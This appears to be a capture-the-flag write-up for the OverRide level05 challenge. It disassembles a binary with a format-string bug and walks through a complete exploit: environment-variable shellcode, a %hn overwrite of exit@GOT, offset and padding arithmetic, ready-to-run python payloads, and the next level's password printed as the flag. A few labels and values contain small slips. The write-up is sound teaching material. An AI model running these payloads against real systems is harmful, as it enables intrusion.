# **Level05**

## **Binary Analysis**

The program reads user input of up to 100 characters, converts uppercase letters to lowercase using XOR (`^ 0x20`), prints the modified string, and exits using `exit(0)`.

```nasm
; Stack Setup
0x08048444 <+0>:     push   %ebp
0x08048445 <+1>:     mov    %esp,%ebp
0x0804844c <+8>:     sub    $0x90,%esp      ; Allocates 144 bytes

; fgets call
0x0804846e <+42>:    lea    0x28(%esp),%eax  ; Buffer at esp+40
0x08048472 <+46>:    mov    %eax,(%esp)
0x08048466 <+34>:    movl   $0x64,0x4(%esp)  ; Size = 100 bytes
0x08048475 <+49>:    call   fgets@plt

; Check character range
0x08048495 <+81>:    cmp    $0x40,%al       ; Compare with '@'
0x08048497 <+83>:    jle    0x80484cb       ; If <= '@', skip
0x080484a7 <+99>:    cmp    $0x5a,%al       ; Compare with 'Z'
0x080484a9 <+101>:   jg     0x80484cb       ; If > 'Z', skip

; XOR operation
0x080484bb <+119>:   xor    $0x20,%edx      ; XOR with 0x20
0x080484c9 <+133>:   mov    %dl,(%eax)      ; Store result

; Format string vulnerability
0x08048507 <+195>:   call   printf@plt      ; Direct printf of buffer

```

## **Vulnerability**

The program has a **format string vulnerability** because it prints user input using `printf` without format specifier safety. This can allow an attacker to **read or write arbitrary memory**.

**Example Exploit:**

```bash
level05@OverRide:~$ ./level05
AAAA%x.%x.%x.%x
aaaa64.f7fcfac0.f7ec3af9.ffffd6bf
level05@OverRide:~$

```

## **Exploit**

The goal is to **overwrite the exit function's address in the GOT** with the address of our shellcode.

**Step 1: Locate exit@GOT Address**

```bash
(gdb) disas 0x8048370
   0x08048370 <+0>: jmp    *0x80497e0
(gdb)

```

**Step 2: Locate Shellcode in Memory**

```bash
(gdb) x/200s environ
...
0xffffdbb4: "PAYLOAD=\220\220\2 ...."
0xffffdc7c: \220\220\2 .... ; nops
0xffffdf9c: /shh/bin\211\343\061\311̀"

```

**Step 3: Split Address for Overwrite**

Since we can't write all 4 bytes at once, we split it into two writes using `%hn` (writes 2 bytes at a time):

```bash
Higher bytes: 0xffff
Lower bytes:  0xdc7c
```

- **Lower 2 bytes**: `0xdc7c` (decimal 56436) → Goes into `0x080497e0`
- **Upper 2 bytes**: `0xffff` (decimal 9091) → Goes into `0x080497e2`

**Step 4: Calculate Padding**

```bash
First write (0xdc7c):
0xdc7c = 56444
56444 - 8 = 56436    # Subtract 8 for the two addresses ()

Second write (0xffff - 0xdc7c):
0xffff - 0xdc7c = 0x2383 = 9091

```

**Step 5: Identify Format String Offset**

```bash
level05@OverRide:~$ ./level05
AAAA%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x.%10$x.%11$x.%12$x
aaaa64.f7fcfac0.f7ec3af9.ffffd2af.ffffd2ae.0.ffffffff.ffffd334.f7fdb000.61616161.78243125.2432252e
																									                        ^
																									                        |
																									           10th position (61616161 = "aaaa")
																									
```

**Step 6: Execute Exploitg**

```bash
export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')

```

```bash
(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56436c"+"%10$hn"+"%9091c"+"%11$hn"'; cat -) | ./level05

```

**Step 7: Get the Flag**

```bash
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

## **Flag**

```bash
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```